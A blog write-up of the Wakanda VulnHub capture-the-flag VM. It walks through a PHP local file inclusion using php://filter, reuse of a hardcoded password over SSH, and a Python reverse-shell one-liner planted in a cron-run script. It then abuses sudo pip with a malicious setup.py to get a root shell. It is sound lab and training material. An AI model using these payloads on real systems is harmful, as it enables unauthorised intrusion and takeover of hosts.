---
layout: post
title: "Wakanda hacking challenge"
date: 2018-08-10 12:50:43 -0400
comments: true
categories: boot2root
---

It's been a while since I've played with a VulnHub boot2root. Several new ones were recently pushed out, and having some free time on my hands, I decided to give [Wakanda](https://www.vulnhub.com/entry/wakanda-1,251/) a go. This VM contains three flags and was listed as having an intermediate difficulty level. Challenge accepted!

I started off by using netdiscover to find the IP address of the VM, which turned out to be 192.168.56.102. A quick port scan returned two ports of interest; 80 and 3333: 

```
root@kali:~/pwn# onetwopunch.sh -t target.txt -p tcp -n '-sV -A' -i eth0
                             _                                          _       _
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/
                                                |_|
                                                                   by superkojiman

[+] Protocol : tcp
[+] Interface: eth0
[+] Nmap opts: -sV -A
[+] Targets  : target.txt
[+] Scanning 192.168.56.102 for tcp ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth0 -mT 192.168.56.102:a -l /root/.onetwopunch/udir/192.168.56.102-tcp.txt
[*] TCP ports for nmap to scan: 80,111,3333,57976,
[+] nmap -e eth0 -sV -A -oX /root/.onetwopunch/ndir/192.168.56.102-tcp.xml -oG /root/.onetwopunch/ndir/192.168.56.102-tcp.grep -p 80,111,3333,57976, 192.168.56.102
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 23:21 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00050s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          57976/tcp  status
|_  100024  1          59389/udp  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
57976/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
[+] Scans completed
[+] Results saved to /root/.onetwopunch
```

Looks like SSH was running on port 3333 instead of the default 22. I didn't have any user credentials at this point, and I hate bruteforcing SSH, so I turned my attention to port 80. This was a web server:

![](/images/2018-08-11/01.png)

Right at the bottom, the author's name is listed: mamadou. Usernames are always handy to collect during enumeration. 

I scanned the web server with Nikto to see if anything interesting came up: 

```
root@kali:~/pwn# nikto -host http://`cat target.txt`
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.102
+ Target Hostname:    192.168.56.102
+ Target Port:        80
+ Start Time:         2018-08-10 23:23:49 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2018-08-10 23:24:07 (GMT-4) (18 seconds)
---------------------------------------------------------------------------
```

No luck there. Next step was to look for any interesting files and directories being hosted. Plenty of tools for that, but these days I like gobuster so I let it search for html, php, js, and txt files: 

```
root@kali:~/pwn# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://`cat target.txt` -l -x html,php,js,txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.56.102/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
[+] Show length  : true
[+] Extensions   : .html,.php,.js,.txt
=====================================================
/index.php (Status: 200) [Size: 1527]
/fr.php (Status: 200) [Size: 0]
/admin (Status: 200) [Size: 0]
/backup (Status: 200) [Size: 0]
/shell (Status: 200) [Size: 0]
/secret (Status: 200) [Size: 0]
/secret.txt (Status: 200) [Size: 40]
/troll (Status: 200) [Size: 0]
/hahaha (Status: 200) [Size: 0]
/hohoho (Status: 200) [Size: 0]
=====================================================
```

Right off the bat it found several empty files. sercret.txt looked promising, but pulling it down revealed that it was just a troll. That left just index.php, so I went ahead and pulled it down. Here's the interesting part: 

```
root@kali:~/pwn# curl http://`cat target.txt`
.
.
.
     <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>
.
.
.
```

One of the lines has been commented out. From the looks of it, it uses the lang parameter to change the page's language. In this case, passing it fr changes the language to French. I figured fr probably corresponded to fr.php which was identified by gobuster. I gave it a shot and sure enough the language changes to French:

```
root@kali:~/pwn# curl "http://`cat target.txt`?lang=fr"
.
.
.
      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!        </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>
.
.
.
```

Since lang is reading the contents of a local file, I made the assumption that this was vulnerable to some kind of local file inclusion attack. I tried passing it variations of "../../../etc/passwd%00" but no luck there. So then I tried using php filters which turned out to be more promising. The contents of fr.php were returned Base-64 encoded, and decoding it revealed the contents of fr.php: 

```
root@kali:~/pwn# curl -s "http://`cat target.txt`/?lang=php://filter/convert.base64-encode/resource=fr" | head -1
PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJlIGR1IHBsdXMgZ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7
root@kali:~/pwn# curl -s "http://`cat target.txt`/?lang=php://filter/convert.base64-encode/resource=fr" | head -1 | base64 -d
<?php

$message="Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!";
```

Great! The only other PHP file I was aware of at this time was index.php, so I decided to grab it and see if its contents could move me further into gaining a foothold into the system: 

```
root@kali:~/pwn# curl -s "http://`cat target.txt`/?lang=php://filter/convert.base64-encode/resource=index" | head -1 | base64 -d
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
.
.
.
```

Ah a password! I already had a username, so I figured the two were credentials for logging into something. Since the only other service I found was SSH on port 3333, it made sense to give that a shot: 

```
root@kali:~/pwn# ssh -p3333 mamadou@`cat target.txt`
mamadou@192.168.56.102's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31)
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Success, kind of. Looks like it dropped me into a Python shell. No problem, that was easy to escape by spawning a shell on a pseudo-terminal:

```
>>> import pty;pty.spawn("/bin/bash")
>>> import pty;pty.spawn("/bin/bash")
mamadou@Wakanda1:~$ id
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
mamadou@Wakanda1:~$ ls -l
total 4
-rw-r--r-- 1 mamadou mamadou 41 Aug  1 15:52 flag1.txt
mamadou@Wakanda1:~$ cat flag1.txt

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```

The first flag was right there, owned by mamadou and so it was readble. Only two flags to go. Since the name of the flags were given in the challenge description I decided to just use the find command to look for it:

```
mamadou@Wakanda1:~$ find / -name flag2.txt 2>/dev/null
/home/devops/flag2.txt
```

So a second user called devops exists. I quickly checked /etc/passwd and found that no other users (other than root) existed on the system. I started enumerating the system to look for any misconfigurations or any odd files that would allow me to privilege escalate to the devops user. Something finally came up when I decided to look for any files belonging to devops: 

```
mamadou@Wakanda1:~$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
```

Couple of interesting files, /srv/.antivirus.py and /tmp/test. I looked at /srv/.antivirus.py and it contained this:

```
open('/tmp/test','w').write('test')
```

This Python script was world writable so I could modify it to execute whatever I wanted. However it wasn't SUID devops, so it would just run under the mamadou user. I looked at /tmp/test and that's when I noticed something interesting:

```
mamadou@Wakanda1:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 devops developer 4 Aug 11 00:27 test
mamadou@Wakanda1:~$ date
Sat Aug 11 00:30:13 EDT 2018
```

The timestamp that the /tmp/test was created was just two minutes ago from when I ran the date command. That led me to believe that /srv/.antivirus was being run on some kind of scheduler. I waited a few more minutes and checked again and noticed that /tmp/test had been updated: 

```
mamadou@Wakanda1:~$ ls -l /tmp/test
-rw-r--r-- 1 devops developer 4 Aug 11 00:32 /tmp/test
```

That's a 5 minute difference since the last run. So it looks like the scheduler executes this Python script as the devops user every 5 minutes. At this point I had a game plan. I modified the .antivirus.py so that it would connect back to my machine and give me a reverse shell as the devops user when the scheduler executed the script


```
mamadou@Wakanda1:/srv$ cat .antivirus.py
open('/tmp/test','w').write('test')
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Next I started a netcat listener on my machine and waited. 5 minutes later, I got a shell as devops:

```
root@kali:~/pwn# nc -lvp 9999
listening on [any] 9999 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 39406
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(devops) gid=1002(developer) groups=1002(developer)
```

I could now get the second flag:

```
$ cat ~/flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
```

The next step was to privelage escalate to the root user to get root.txt; which I assumed was in /root. As it turns out, devops has sudo access:

```
$ sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

So devops can run pip as the root user. That's different. I checked the permissions on /usr/bin/pip and sure enough, it was SUID root. 

```
$ ls -l /usr/bin/pip
-rwxr-sr-- 1 root developer 281 Feb 27  2015 /usr/bin/pip
```

So how to get a root shell? pip can install a package from a local directory when the -e flag is passed to the install option. pip will look for a setup.py in the directory and execute that. So all I needed to do was create a setup.py that would give me a root shell. In this case, I decided to re-use the connect-back script in .antivirus.py and just changed the port number. 

```
$ pwd
/home/devops
$ mkdir win
$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > win/setup.py
``` 

I started up another netcat listener to receive the root shell, and executed pip with sudo:

```
root@kali:~/pwn# nc -lvp 9998
listening on [any] 9998 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 57599
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
```

Success! The root.txt was now accessible, reading it netted me the final flag: 

```
# cat /root/root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```

Wakanda forever!
